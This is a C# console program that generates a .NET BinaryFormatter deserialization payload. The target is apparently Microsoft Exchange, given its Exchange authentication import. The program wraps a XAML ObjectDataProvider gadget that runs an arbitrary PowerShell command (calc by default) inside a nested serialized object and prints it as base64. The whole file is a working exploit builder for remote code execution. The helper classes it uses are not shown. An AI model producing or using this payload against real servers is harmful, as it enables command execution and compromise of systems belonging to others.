using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Exchange.Security.Authentication;
using System.Reflection;
using System.Security.Claims;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;

namespace ConsoleApp1
{
    class Program
    {
        static void Main(string[] args)
        {
            string cmd = (args.Length > 0) ? args[0] : "calc";
            string payload = @"<ResourceDictionary
              xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
              xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
              xmlns:System=""clr-namespace:System;assembly=mscorlib""
              xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
                    <ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
                 <ObjectDataProvider.MethodParameters>
                    <System:String>powershell</System:String>
                    <System:String>-c """ + cmd + @""" </System:String>
                 </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
            </ResourceDictionary>";

            Object obj = new Class3(payload);
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            MemoryStream stream = new MemoryStream();
            binaryFormatter.Serialize(stream, obj);
            string s = Convert.ToBase64String(stream.GetBuffer(), 0, (int)stream.Length);

            Class1 o = new Class1("t");
            FieldInfo fi = typeof(Class1).GetField("Gadget");
            fi.SetValue(o, s);
            MemoryStream memoryStream = new MemoryStream();
            BinaryFormatter formatter = new BinaryFormatter();
            formatter.Binder = new Class2();
            formatter.Serialize(memoryStream, o);
            Console.WriteLine(Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length));
        }
    }
}
